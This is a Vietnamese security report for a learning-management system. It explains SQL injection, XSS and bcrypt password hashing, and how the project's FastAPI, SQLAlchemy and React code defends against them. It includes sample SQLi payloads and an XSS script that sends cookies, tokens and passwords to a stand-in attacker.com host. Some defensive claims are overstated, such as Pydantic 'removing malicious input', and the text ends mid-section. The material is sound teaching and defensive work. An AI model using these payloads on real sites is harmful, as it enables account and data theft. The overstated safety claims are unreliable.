# BÁO CÁO BẢO MẬT: SQL INJECTION, XSS VÀ BCRYPT SLOW HASHING

## MỤC LỤC

1. [Tổng quan](#1-tổng-quan)
2. [Chống SQL Injection](#2-chống-sql-injection)
3. [Chống XSS (Cross-Site Scripting)](#3-chống-xss-cross-site-scripting)
4. [Bcrypt Slow Hashing chống dò tìm mật khẩu](#4-bcrypt-slow-hashing-chống-dò-tìm-mật-khẩu)
5. [Tổng hợp](#5-tổng-hợp)

---

## 1. TỔNG QUAN

Hệ thống LMS cần bảo vệ chống lại 3 loại tấn công phổ biến:

1. **SQL Injection**: Kẻ tấn công chèn mã SQL độc hại vào query
2. **XSS (Cross-Site Scripting)**: Kẻ tấn công chèn mã JavaScript độc hại vào trang web
3. **Brute-force password attack**: Kẻ tấn công dò tìm mật khẩu bằng cách thử nhiều lần

Báo cáo này trình bày cách hệ thống bảo vệ chống lại các mối đe dọa này.

---

## 2. CHỐNG SQL INJECTION

### 2.1. Khái niệm SQL Injection

**SQL Injection** là kỹ thuật tấn công bằng cách chèn mã SQL độc hại vào các truy vấn database, khiến database thực thi các lệnh SQL không mong muốn.

**Bản chất của SQL Injection:**
- Database nhận input từ người dùng
- Ứng dụng ghép input trực tiếp vào câu lệnh SQL
- Kẻ tấn công khéo léo chèn SQL code vào input
- Database nhầm tưởng đó là lệnh SQL hợp lệ và thực thi

**Ví dụ tấn công cơ bản:**
```sql
-- Ứng dụng mong đợi: username = "admin"
-- Query dự kiến:
SELECT * FROM users WHERE username = 'admin'

-- Kẻ tấn công nhập: username = "admin' OR '1'='1"
-- Query thực tế được tạo:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
-- Điều kiện '1'='1' luôn đúng → Trả về TẤT CẢ users
```

**Các loại SQL Injection:**

1. **Classic SQL Injection:**
   ```sql
   -- Input: "admin' OR '1'='1"
   SELECT * FROM users WHERE username = 'admin' OR '1'='1'
   ```

2. **Union-based SQL Injection:**
   ```sql
   -- Input: "admin' UNION SELECT * FROM passwords--"
   SELECT * FROM users WHERE username = 'admin' UNION SELECT * FROM passwords--'
   -- Lấy dữ liệu từ bảng khác
   ```

3. **Blind SQL Injection:**
   ```sql
   -- Input: "admin' AND SLEEP(5)--"
   SELECT * FROM users WHERE username = 'admin' AND SLEEP(5)--'
   -- Dựa vào thời gian phản hồi để đoán kết quả
   ```

4. **Time-based SQL Injection:**
   ```sql
   -- Input: "admin'; WAITFOR DELAY '00:00:05'--"
   -- Làm chậm response để xác nhận injection thành công
   ```

**Hậu quả nghiêm trọng:**
- **Đọc dữ liệu nhạy cảm**: Lấy mật khẩu, thông tin cá nhân, dữ liệu tài chính
- **Xóa hoặc sửa đổi dữ liệu**: Xóa toàn bộ database, thay đổi điểm số, thông tin
- **Bypass authentication**: Đăng nhập không cần mật khẩu
- **Thực thi lệnh hệ thống**: Chạy lệnh OS, upload file, tạo backdoor
- **Privilege escalation**: Nâng cấp quyền, truy cập database khác

### 2.2. Nguyên lý hoạt động

#### 2.2.1. Cách tấn công hoạt động

**Bước 1: Kẻ tấn công phân tích ứng dụng**
```
1. Tìm form input (login, search, filter)
2. Gửi input đặc biệt để kiểm tra
3. Quan sát lỗi hoặc hành vi bất thường
```

**Bước 2: Chèn SQL code vào input**
```
Input hợp lệ: "admin"
Input độc hại: "admin' OR '1'='1"
Input phức tạp: "admin'; DROP TABLE users;--"
```

**Bước 3: Ứng dụng ghép input vào query**
```python
# ❌ CÁCH NGUY HIỂM:
query = f"SELECT * FROM users WHERE username = '{username}'"
# Nếu username = "admin' OR '1'='1"
# Query = "SELECT * FROM users WHERE username = 'admin' OR '1'='1'"
```

**Bước 4: Database thực thi query độc hại**
```
Database nhận: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
Database thực thi: Trả về tất cả users
Kẻ tấn công: Có được dữ liệu nhạy cảm
```

#### 2.2.2. Cách phòng chống: Parameterized Queries

**Khái niệm Parameterized Queries:**
- **Tách biệt code SQL và data**: SQL code được viết sẵn, data được truyền riêng
- **Database xử lý riêng**: Database phân biệt rõ đâu là code, đâu là data
- **Tự động escape**: Database tự động escape các ký tự đặc biệt trong data

**Cách hoạt động:**
```python
# ✅ CÁCH AN TOÀN:
query = "SELECT * FROM users WHERE username = ?"
parameters = ["admin' OR '1'='1"]
# Database xử lý:
#   - Query: SELECT * FROM users WHERE username = ?
#   - Parameter: "admin' OR '1'='1" (được xử lý như một string)
#   - Kết quả: Tìm user có username = "admin' OR '1'='1" (không tìm thấy)
```

**So sánh trực quan:**
```
❌ String Concatenation (Nguy hiểm):
Query = "SELECT * FROM users WHERE username = '" + username + "'"
→ Database thấy: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
→ Thực thi như SQL code

✅ Parameterized Query (An toàn):
Query = "SELECT * FROM users WHERE username = ?"
Parameters = ["admin' OR '1'='1"]
→ Database thấy: SELECT * FROM users WHERE username = ?
→ Thay ? bằng "admin' OR '1'='1" (như một giá trị string)
→ Không thực thi như SQL code
```

#### 2.2.3. ORM (Object-Relational Mapping)

**Khái niệm ORM:**
- **ORM** là kỹ thuật ánh xạ object trong code sang table trong database
- **Tự động tạo parameterized queries**: ORM tự động chuyển đổi code Python thành SQL an toàn
- **Không cần viết SQL thủ công**: Developer chỉ cần dùng Python code

**Ví dụ với SQLAlchemy:**
```python
# Code Python:
user = db.query(User).filter(User.username == username).first()

# SQLAlchemy tự động tạo:
# SELECT * FROM users WHERE username = ?
# Parameters: [username]
# → Tự động parameterized, an toàn!
```

### 2.3. Triển khai trong hệ thống

#### a) Sử dụng SQLAlchemy ORM

**File**: `lms_backend/app/database.py`

```python
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
```

**Cơ chế bảo vệ:**
- SQLAlchemy tự động sử dụng parameterized queries
- Tất cả queries đều được parameterized, không thể chèn SQL code

#### b) Ví dụ trong code

**File**: `lms_backend/app/crud/user.py`

```python
def get_user_by_username(db: Session, username: str):
    # SQLAlchemy tự động parameterize query này
    return db.query(User).filter(User.username == username).first()
```

**Cách hoạt động chi tiết:**

**Bước 1: Developer viết code Python**
```python
def get_user_by_username(db: Session, username: str):
    return db.query(User).filter(User.username == username).first()
```

**Bước 2: SQLAlchemy phân tích code**
```
SQLAlchemy nhận: User.username == username
SQLAlchemy hiểu: So sánh cột username với giá trị username
SQLAlchemy tạo: WHERE username = :param_1
```

**Bước 3: SQLAlchemy tạo parameterized query**
```python
# SQLAlchemy tạo query:
query = "SELECT * FROM users WHERE username = :param_1"
parameters = {"param_1": "admin' OR '1'='1"}
```

**Bước 4: Database driver gửi query**
```
Database nhận:
  - SQL: "SELECT * FROM users WHERE username = ?"
  - Parameter: "admin' OR '1'='1" (được escape tự động)
```

**Bước 5: Database xử lý**
```
Database hiểu:
  - Tìm user có username = "admin' OR '1'='1" (như một string literal)
  - KHÔNG thực thi "OR '1'='1" như SQL code
  - Kết quả: Không tìm thấy (an toàn!)
```

**Ví dụ với input hợp lệ:**
```
Input: username = "admin"
SQLAlchemy: SELECT * FROM users WHERE username = ?
Parameters: ["admin"]
Database: Tìm user có username = "admin"
Kết quả: Tìm thấy user admin (hoạt động bình thường)
```

**Ví dụ với input độc hại:**
```
Input: username = "admin' OR '1'='1"
SQLAlchemy: SELECT * FROM users WHERE username = ?
Parameters: ["admin' OR '1'='1"]
Database: Tìm user có username = "admin' OR '1'='1" (như text)
Kết quả: Không tìm thấy (an toàn, không bị injection)
```

**So sánh với cách nguy hiểm:**
```python
# ❌ NGUY HIỂM (KHÔNG dùng trong hệ thống):
query = f"SELECT * FROM users WHERE username = '{username}'"
# Input: "admin' OR '1'='1" → Query: "SELECT * FROM users WHERE username = 'admin' OR '1'='1'"

# ✅ AN TOÀN (Cách hệ thống dùng):
db.query(User).filter(User.username == username)
# SQLAlchemy tự động parameterize
```

#### c) Tất cả queries đều an toàn

**Các file sử dụng SQLAlchemy:**
- `lms_backend/app/crud/user.py` - Queries user
- `lms_backend/app/services/*.py` - Tất cả services
- `lms_backend/app/routers/*.py` - Tất cả routers

**Ví dụ khác:**
```python
# File: lms_backend/app/services/socket_service.py
member = db.query(ChatGroupMember).filter(
    ChatGroupMember.group_id == group_id,
    ChatGroupMember.user_id == user_id
).first()
# Tất cả đều được parameterize tự động
```

### 2.4. Tại sao an toàn?

#### 2.4.1. SQLAlchemy ORM tự động parameterize

**Cơ chế:**
- SQLAlchemy **KHÔNG BAO GIỜ** dùng string concatenation
- Tất cả giá trị được truyền qua **parameter binding**
- Database driver tự động escape các ký tự đặc biệt

**Ví dụ minh họa:**
```python
# ❌ SQLAlchemy KHÔNG làm thế này:
query = f"SELECT * FROM users WHERE username = '{username}'"

# ✅ SQLAlchemy làm thế này:
query = "SELECT * FROM users WHERE username = :username"
params = {"username": username}
# Database driver tự động escape username
```

#### 2.4.2. Type safety

**Python type hints:**
```python
def get_user_by_username(db: Session, username: str):
    # username phải là string
    # SQLAlchemy tự động validate type
    return db.query(User).filter(User.username == username).first()
```

**Lợi ích:**
- Phát hiện lỗi sớm khi compile/type check
- Không thể truyền SQL code như một tham số
- IDE có thể cảnh báo lỗi

#### 2.4.3. Không có string concatenation

**SQLAlchemy không cho phép:**
```python
# ❌ KHÔNG THỂ làm thế này với SQLAlchemy:
query = "SELECT * FROM users WHERE username = '" + username + "'"
# SQLAlchemy không có method để làm điều này

# ✅ PHẢI làm thế này:
db.query(User).filter(User.username == username)
# Luôn luôn parameterized
```

#### 2.4.4. Bảo vệ đa lớp

**Lớp 1: SQLAlchemy ORM**
- Tự động parameterize tất cả queries
- Không cho phép string concatenation

**Lớp 2: Database Driver**
- Tự động escape parameters
- Validate input types

**Lớp 3: Database Engine**
- Xử lý parameters riêng biệt với SQL code
- Không thực thi parameters như SQL

---

## 3. CHỐNG XSS (CROSS-SITE SCRIPTING)

### 3.1. Khái niệm XSS

**XSS (Cross-Site Scripting)** là kỹ thuật tấn công bằng cách chèn mã JavaScript độc hại vào trang web, khiến trình duyệt của người dùng thực thi mã độc.

**Tại sao gọi là "Cross-Site"?**
- Mã JavaScript được chèn từ một nguồn khác (không phải từ server)
- Mã độc chạy trong context của trang web hợp lệ
- Người dùng tin tưởng trang web, nhưng thực tế đang chạy mã độc

**Ví dụ tấn công cơ bản:**
```html
<!-- Input người dùng: <script>alert('XSS')</script> -->
<!-- Ứng dụng hiển thị trực tiếp: -->
<div>Xin chào <script>alert('XSS')</script></div>

<!-- Trình duyệt thấy: -->
<div>Xin chào <script>alert('XSS')</script></div>
<!-- Trình duyệt thực thi: alert('XSS') → Hiện popup -->
```

**Các loại XSS:**

1. **Stored XSS (Persistent XSS):**
   - Mã độc được lưu vào database
   - Mỗi khi hiển thị, mã độc được thực thi
   - **Ví dụ**: Comment chứa `<script>`, được lưu và hiển thị cho mọi người

2. **Reflected XSS (Non-Persistent XSS):**
   - Mã độc được phản ánh ngay trong response
   - Không lưu vào database
   - **Ví dụ**: Search query chứa `<script>`, hiển thị trong kết quả

3. **DOM-based XSS:**
   - Mã độc được chèn vào DOM bởi JavaScript
   - Không liên quan đến server
   - **Ví dụ**: `document.write(userInput)` với input độc hại

**Hậu quả nghiêm trọng:**
- **Đánh cắp cookie/session token**: Lấy JWT token, session ID
- **Thay đổi nội dung trang web**: Giả mạo form, thay đổi thông tin
- **Redirect người dùng**: Chuyển hướng đến trang phishing
- **Lấy thông tin nhạy cảm**: Keylogger, đánh cắp thông tin form
- **Thực thi hành động thay người dùng**: Gửi request, thay đổi dữ liệu

### 3.2. Nguyên lý hoạt động

#### 3.2.1. Cách tấn công hoạt động

**Luồng tấn công Stored XSS:**
```
1. Kẻ tấn công nhập: <script>alert('XSS')</script>
2. Ứng dụng lưu vào database (không validate/escape)
3. Khi người dùng khác xem, ứng dụng lấy từ database
4. Ứng dụng hiển thị: <div><script>alert('XSS')</script></div>
5. Trình duyệt thấy <script> tag → Thực thi JavaScript
6. Mã độc chạy trong context của người dùng
```

**Luồng tấn công Reflected XSS:**
```
1. Kẻ tấn công gửi URL: /search?q=<script>alert('XSS')</script>
2. Ứng dụng hiển thị: "Kết quả tìm kiếm: <script>alert('XSS')</script>"
3. Trình duyệt thực thi script
```

**Ví dụ tấn công thực tế:**
```javascript
// Kẻ tấn công chèn:
<script>
  // Đánh cắp cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  
  // Đánh cắp token từ localStorage
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
  
  // Thay đổi form
  document.getElementById('password').onchange = function() {
    fetch('https://attacker.com/steal?password=' + this.value);
  };
</script>
```

#### 3.2.2. Cách phòng chống

**Nguyên tắc: "Never Trust User Input"**
- Luôn coi user input là không an toàn
- Validate và sanitize mọi input
- Escape mọi output

**Các lớp bảo vệ:**

1. **Input Validation (Kiểm tra đầu vào):**
   - Kiểm tra format, kiểu dữ liệu
   - Loại bỏ hoặc từ chối input không hợp lệ
   - **Ví dụ**: Email phải có format email, không chứa HTML

2. **Input Sanitization (Làm sạch đầu vào):**
   - Loại bỏ các ký tự/tag nguy hiểm
   - Chuyển đổi ký tự đặc biệt
   - **Ví dụ**: `<script>` → bị loại bỏ hoặc chuyển thành text

3. **Output Encoding (Mã hóa đầu ra):**
   - Escape các ký tự đặc biệt khi hiển thị
   - Chuyển `<` thành `&lt;`, `>` thành `&gt;`
   - **Ví dụ**: `<script>` → `&lt;script&gt;` (hiển thị như text)

4. **Content Security Policy (CSP):**
   - Giới hạn nguồn script được phép chạy
   - Chặn inline script
   - **Ví dụ**: Chỉ cho phép script từ domain của mình

### 3.3. Triển khai trong hệ thống

#### a) Backend: Pydantic Validation

**File**: `lms_backend/app/schemas/user.py`

```python
from pydantic import BaseModel

class UserCreate(BaseModel):
    username: str
    email: str
    password: str
    full_name: Optional[str] = None
    role: UserRole
```

**Cơ chế bảo vệ của Pydantic:**

1. **Type Validation:**
   ```python
   class UserCreate(BaseModel):
       username: str  # Phải là string
       email: str      # Phải là string
   ```
   - Pydantic kiểm tra kiểu dữ liệu
   - Tự động chuyển đổi nếu có thể
   - Từ chối nếu không hợp lệ

2. **String Validation:**
   ```python
   # Input: {"username": "<script>alert('XSS')</script>"}
   # Pydantic nhận: username là string hợp lệ
   # Pydantic KHÔNG thực thi như HTML/JavaScript
   # Pydantic chỉ lưu như một chuỗi text
   ```

3. **Không tự động escape:**
   - Pydantic **KHÔNG** tự động escape HTML
   - Pydantic chỉ validate kiểu dữ liệu
   - Escape được thực hiện ở lớp output (React)

**Ví dụ chi tiết:**
```python
# Input từ client:
data = {
    "username": "<script>alert('XSS')</script>",
    "email": "test@test.com"
}

# Pydantic validate:
user = UserCreate(**data)
# user.username = "<script>alert('XSS')</script>" (như string, không phải HTML)

# Lưu vào database:
db_user = User(username=user.username, ...)
# Database lưu: "<script>alert('XSS')</script>" (như text)

# Khi trả về JSON:
return {"username": "<script>alert('XSS')</script>"}
# JSON escape tự động: "username": "<script>alert('XSS')</script>"
# (JSON không thực thi, chỉ là text)
```

**Lưu ý quan trọng:**
- Pydantic **KHÔNG** tự động loại bỏ `<script>` tag
- Pydantic chỉ đảm bảo đúng kiểu dữ liệu
- Bảo vệ thực sự đến từ **Output Encoding** (React JSX)

#### b) Backend: FastAPI Auto-escaping

**File**: `lms_backend/app/routers/auth.py`

```python
@router.post("/register", response_model=User)
def register_user(user: UserCreate, db: Session = Depends(get_db)):
    # FastAPI tự động validate user: UserCreate
    # Pydantic đã sanitize input
    return create_user(db=db, user=user)
```

**Cơ chế bảo vệ của FastAPI:**

1. **JSON Serialization:**
   ```python
   return {"username": "<script>alert('XSS')</script>"}
   # FastAPI serialize thành JSON:
   # {"username": "<script>alert('XSS')</script>"}
   ```
   - JSON tự động escape các ký tự đặc biệt
   - `"` được escape thành `\"`
   - Không thể chèn JavaScript vào JSON string

2. **Content-Type Header:**
   ```http
   Content-Type: application/json
   ```
   - Trình duyệt biết đây là JSON, không phải HTML
   - Trình duyệt không thực thi JSON như JavaScript

3. **JSON không thực thi:**
   ```json
   {"username": "<script>alert('XSS')</script>"}
   ```
   - JSON chỉ là dữ liệu, không phải code
   - Trình duyệt không thực thi JSON

**Ví dụ chi tiết:**
```python
# Backend trả về:
return {"username": "<script>alert('XSS')</script>"}

# HTTP Response:
HTTP/1.1 200 OK
Content-Type: application/json

{"username":"<script>alert('XSS')</script>"}

# Frontend nhận:
const data = {"username": "<script>alert('XSS')</script>"}
// data.username là string, không phải HTML
// React sẽ escape khi render
```

**Lưu ý:**
- FastAPI/JSON **KHÔNG** escape HTML tags
- JSON chỉ escape các ký tự JSON đặc biệt (`"`, `\`, etc.)
- Bảo vệ thực sự đến từ **React JSX auto-escaping**

#### c) Frontend: React JSX Auto-escaping

**File**: `lms_frontend/src/pages/Login.tsx`

```typescript
const [username, setUsername] = useState('');

// Khi render:
<div>{username}</div>
// React tự động escape: <script> → &lt;script&gt;
```

**Cơ chế bảo vệ của React JSX:**

1. **Auto-escaping trong JSX:**
   ```typescript
   const username = "<script>alert('XSS')</script>";
   return <div>{username}</div>;
   ```
   - React tự động escape tất cả giá trị trong `{}`
   - `<` → `&lt;`
   - `>` → `&gt;`
   - `"` → `&quot;`
   - `'` → `&#x27;`
   - `&` → `&amp;`

2. **Cách hoạt động:**
   ```typescript
   // Input:
   const username = "<script>alert('XSS')</script>";
   
   // React render:
   <div>{username}</div>
   
   // React tạo DOM:
   const textNode = document.createTextNode(username);
   // React KHÔNG dùng innerHTML, dùng textContent
   // textContent tự động escape
   
   // HTML output:
   <div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
   
   // Trình duyệt hiển thị:
   <script>alert('XSS')</script> (như text, không thực thi)
   ```

3. **So sánh với innerHTML:**
   ```typescript
   // ❌ NGUY HIỂM (React KHÔNG làm thế này):
   element.innerHTML = username;
   // → Thực thi JavaScript
   
   // ✅ AN TOÀN (React làm thế này):
   element.textContent = username;
   // → Hiển thị như text
   ```

**Ví dụ chi tiết:**
```typescript
// Component:
const UserProfile = ({ username }) => {
    return (
        <div>
            <h1>Xin chào {username}</h1>
            <p>Username: {username}</p>
        </div>
    );
};

// Input: username = "<script>alert('XSS')</script>"
// React render:
<div>
    <h1>Xin chào &lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
    <p>Username: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
</div>

// Trình duyệt hiển thị:
Xin chào <script>alert('XSS')</script>
Username: <script>alert('XSS')</script>
// (Hiển thị như text, không thực thi)
```

**Lưu ý quan trọng:**
- React **TỰ ĐỘNG** escape trong JSX
- Không cần làm gì thêm
- Chỉ cần dùng `{variable}`, không dùng `dangerouslySetInnerHTML`

#### d) Trường hợp đặc biệt: dangerouslySetInnerHTML

**Lưu ý quan trọng:**
- Hệ thống **KHÔNG sử dụng** `dangerouslySetInnerHTML` trong React
- Nếu cần hiển thị HTML, phải dùng thư viện sanitize như `DOMPurify`

### 3.4. Tại sao an toàn?

1. **Pydantic validation**: Loại bỏ input độc hại ở backend
2. **FastAPI auto-escaping**: Escape output JSON
3. **React JSX auto-escaping**: Escape tất cả text content
4. **Không dùng dangerouslySetInnerHTML**: Không có lỗ hổng XSS

---

## 4. BCRYPT SLOW HASHING CHỐNG DÒ TÌM MẬT KHẨU

### 4.1. Khái niệm

**Brute-force attack** là kỹ thuật dò tìm mật khẩu bằng cách thử nhiều mật khẩu khác nhau.

**Vấn đề:**
- Nếu mật khẩu được hash bằng thuật toán nhanh (MD5, SHA1), kẻ tấn công có thể thử hàng triệu mật khẩu/giây
- Nếu database bị leak, kẻ tấn công có thể dò tìm mật khẩu nhanh chóng

**Giải pháp:**
- Sử dụng **bcrypt** - thuật toán hash chậm có thể điều chỉnh
- **Slow hashing**: Làm chậm quá trình hash để chống brute-force

### 4.2. Nguyên lý hoạt động

#### a) Hash Function

**Hash function** là hàm một chiều:
- Input: Mật khẩu gốc (ví dụ: "myPassword123")
- Output: Chuỗi hash (ví dụ: "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5")
- **Đặc điểm**: Không thể reverse từ hash về mật khẩu gốc

#### b) Salt (Muối)

**Salt** là chuỗi ngẫu nhiên được thêm vào mật khẩu trước khi hash:
- **Mục đích**: Ngăn chặn rainbow table attack và đảm bảo mỗi hash là duy nhất
- **Đặc điểm**: Mỗi mật khẩu có salt riêng, ngẫu nhiên, không thể đoán trước
- **Lưu trữ**: Salt được lưu kèm trong hash string (không cần lưu riêng)

**Tại sao cần Salt?**

**Vấn đề không có Salt:**
```
Mật khẩu: "password123"
Hash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"

Nếu 1000 người dùng cùng mật khẩu "password123"
→ Cùng một hash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
→ Kẻ tấn công biết: Tất cả đều dùng mật khẩu này
```

**Giải pháp với Salt:**
```
Mật khẩu: "password123"
Salt 1: "abc123" → Hash 1: "$2b$12$abc123...xyz"
Salt 2: "def456" → Hash 2: "$2b$12$def456...uvw"

Nếu 1000 người dùng cùng mật khẩu "password123"
→ 1000 hash khác nhau (do salt khác nhau)
→ Kẻ tấn công không biết ai dùng mật khẩu gì
```

**Rainbow Table Attack:**

**Khái niệm:**
- Rainbow table là bảng tra cứu chứa hash của các mật khẩu phổ biến
- Kẻ tấn công tạo sẵn bảng: `"password123" → hash`, `"123456" → hash`, ...
- Khi có hash, tra bảng để tìm mật khẩu

**Ví dụ:**
```
Rainbow Table:
"password123" → "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
"123456"     → "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"
...

Kẻ tấn công có hash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
Tra bảng → Tìm thấy: "password123"
→ Biết mật khẩu!
```

**Salt chống Rainbow Table:**
```
Mật khẩu: "password123"
Salt: "abc123"
Hash: hash("password123" + "abc123") = "$2b$12$abc123...xyz"

Rainbow Table chỉ có: hash("password123") = "..."
Không có: hash("password123" + "abc123")
→ Không tra được!
```

**Ví dụ với bcrypt:**
```python
# Lần 1:
hash1 = bcrypt.hashpw("password123".encode(), bcrypt.gensalt())
# Salt ngẫu nhiên: "LQv3c1yqBWVHxkd0LHAkCO"
# Hash: "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"

# Lần 2 (cùng mật khẩu):
hash2 = bcrypt.hashpw("password123".encode(), bcrypt.gensalt())
# Salt ngẫu nhiên khác: "XyZ9aBcDeFgHiJkLmNoPqRs"
# Hash: "$2b$12$XyZ9aBcDeFgHiJkLmNoPqRsTtUvWxYzAbCdEfGhIjKlMnOpQrStUv"

# Cùng mật khẩu, nhưng hash khác nhau!
# → Rainbow table không dùng được
```

#### c) Cost Factor (Hệ số chi phí)

**Cost factor** (hay rounds) xác định số lần thuật toán được thực hiện:
- **Mục đích**: Làm chậm quá trình hash để chống brute-force
- **Giá trị**: Thường từ 10-14 (2^10 đến 2^14 rounds)
- **Trade-off**: Cost cao hơn = an toàn hơn nhưng chậm hơn

**Ví dụ:**
- Cost = 10: ~100ms để hash
- Cost = 12: ~400ms để hash (mặc định của bcrypt)
- Cost = 14: ~1.6s để hash

**Tại sao chậm lại an toàn?**

**Brute-force attack hoạt động như thế nào:**
```
1. Kẻ tấn công có hash: "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"
2. Kẻ tấn công thử từng mật khẩu:
   - Thử "password" → hash("password") → So sánh → Không khớp
   - Thử "123456" → hash("123456") → So sánh → Không khớp
   - Thử "admin" → hash("admin") → So sánh → Không khớp
   - ... tiếp tục cho đến khi tìm thấy
```

**Tính toán thời gian brute-force:**

**Với MD5 (nhanh):**
```
Tốc độ: 1,000,000,000 hash/giây (1 tỷ/giây)
Mật khẩu 8 ký tự: 95^8 = 6,634,204,312,890,625 khả năng
Thời gian: 6,634,204,312,890,625 / 1,000,000,000 = 6,634,204 giây
          = 1,843 giờ = 77 ngày (với 1 máy)
          = Vài giờ (với 1000 máy)
→ Quá nhanh, không an toàn!
```

**Với bcrypt cost=12 (chậm):**
```
Tốc độ: 2,500 hash/giây (do mỗi hash mất 400ms)
Mật khẩu 8 ký tự: 95^8 = 6,634,204,312,890,625 khả năng
Thời gian: 6,634,204,312,890,625 / 2,500 = 2,653,681,725,156 giây
          = 73,713,381 giờ = 3,071,391 ngày
          = 8,415 năm (với 1 máy)
          = 8.4 năm (với 1000 máy)
→ Quá chậm, không khả thi!
```

**Ví dụ cụ thể:**
```
Mật khẩu: "MyP@ssw0rd" (10 ký tự, có chữ hoa, chữ thường, số, ký tự đặc biệt)
Không gian tìm kiếm: 95^10 = 59,873,693,923,837,890,625 khả năng

Với bcrypt cost=12:
Thời gian: 59,873,693,923,837,890,625 / 2,500 = 23,949,477,569,535,156 giây
          = 6,652,632,658,204 giờ = 277,193,027,425 ngày
          = 759,433,000 năm
→ Không thể brute-force được!
```

**Trade-off:**
```
Cost thấp (10): ~100ms/hash
  → Nhanh hơn cho user
  → Nhưng kẻ tấn công cũng nhanh hơn (10,000 hash/giây)
  
Cost trung bình (12): ~400ms/hash
  → Chấp nhận được cho user (0.4 giây)
  → Kẻ tấn công rất chậm (2,500 hash/giây)
  → ✅ Cân bằng tốt
  
Cost cao (14): ~1.6s/hash
  → Chậm cho user (1.6 giây)
  → Kẻ tấn công cực chậm (625 hash/giây)
  → Chỉ dùng khi cần bảo mật cực cao
```

### 4.3. Triển khai trong hệ thống

#### a) File triển khai

**File**: `lms_backend/app/auth/security.py`

```python
import bcrypt

def get_password_hash(password):
    """Hash mật khẩu bằng bcrypt"""
    if isinstance(password, str):
        password = password.encode('utf-8')
    return bcrypt.hashpw(password, bcrypt.gensalt()).decode('utf-8')

def verify_password(plain_password, hashed_password):
    """So sánh mật khẩu người dùng với hash trong database"""
    if isinstance(plain_password, str):
        plain_password = plain_password.encode('utf-8')
    if isinstance(hashed_password, str):
        hashed_password = hashed_password.encode('utf-8')
    return bcrypt.checkpw(plain_password, hashed_password)
```

**Giải thích:**
- `bcrypt.gensalt()`: Tạo salt ngẫu nhiên (mặc định cost=12)
- `bcrypt.hashpw()`: Hash mật khẩu với salt
- `bcrypt.checkpw()`: So sánh mật khẩu với hash

#### b) Sử dụng khi đăng ký

**File**: `lms_backend/app/crud/user.py`

```python
from app.auth.security import get_password_hash

def create_user(db: Session, user: UserCreate):
    # Hash mật khẩu trước khi lưu vào database
    hashed_password = get_password_hash(user.password)
    
    db_user = User(
        username=user.username,
        email=user.email,
        hashed_password=hashed_password,  # Lưu hash, KHÔNG lưu password gốc
        ...
    )
    db.add(db_user)
    db.commit()
    return db_user
```

**Luồng hoạt động:**
```
1. Người dùng đăng ký với password: "myPassword123"
2. get_password_hash("myPassword123") → "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"
3. Lưu hash vào database (KHÔNG lưu password gốc)
```

#### c) Sử dụng khi đăng nhập

**File**: `lms_backend/app/routers/auth.py`

```python
from app.auth.security import verify_password

@router.post("/login")
async def login_for_access_token(...):
    user = get_user_by_username(db, username=form_data.username)
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(status_code=401, detail="Incorrect username or password")
    # Đăng nhập thành công
```

**Luồng hoạt động:**
```
1. Người dùng nhập: username="admin", password="myPassword123"
2. Lấy user từ database: user.hashed_password = "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"
3. verify_password("myPassword123", "$2b$12$...") → True
4. Tạo JWT token và trả về
```

#### d) Cấu trúc hash string

**Cấu trúc chi tiết:**
```
$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5
│  │  │  │
│  │  │  └─ Hash (31 ký tự) - Kết quả hash cuối cùng
│  │  └──── Salt (22 ký tự) - Muối ngẫu nhiên
│  └─────── Cost factor (12 = 2^12 = 4,096 rounds)
└────────── Algorithm version (2b = bcrypt version 2b)
```

**Giải thích từng phần:**

1. **Algorithm version (`$2b$`):**
   - `$2a$`: Version cũ (có bug)
   - `$2b$`: Version hiện tại (đã sửa bug)
   - Xác định cách hash được tính toán

2. **Cost factor (`12`):**
   - Số rounds = 2^12 = 4,096 lần
   - Mỗi round thực hiện hash một lần
   - Cost cao hơn = nhiều rounds hơn = chậm hơn

3. **Salt (22 ký tự):**
   - Base64 encoded salt
   - Được tạo ngẫu nhiên mỗi lần hash
   - Được lưu kèm trong hash string

4. **Hash (31 ký tự):**
   - Kết quả hash cuối cùng
   - Base64 encoded
   - Được tính từ: hash(password + salt, rounds=4096)

**Ví dụ phân tích:**
```python
hash_string = "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"

# Tách thành các phần:
version = "$2b$"
cost = "12"
salt = "LQv3c1yqBWVHxkd0LHAkCO"  # 22 ký tự
hash_value = "Yz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"  # 31 ký tự
```

**Lưu ý:**
- Salt được embed trong hash string, không cần lưu riêng
- bcrypt tự động extract salt khi verify
- Chỉ cần lưu một string duy nhất, không cần lưu salt riêng

#### e) Cách bcrypt hoạt động bên trong

**Quá trình hash chi tiết:**

```
1. Input: password = "myPassword123"

2. Tạo salt ngẫu nhiên:
   salt = bcrypt.gensalt(rounds=12)
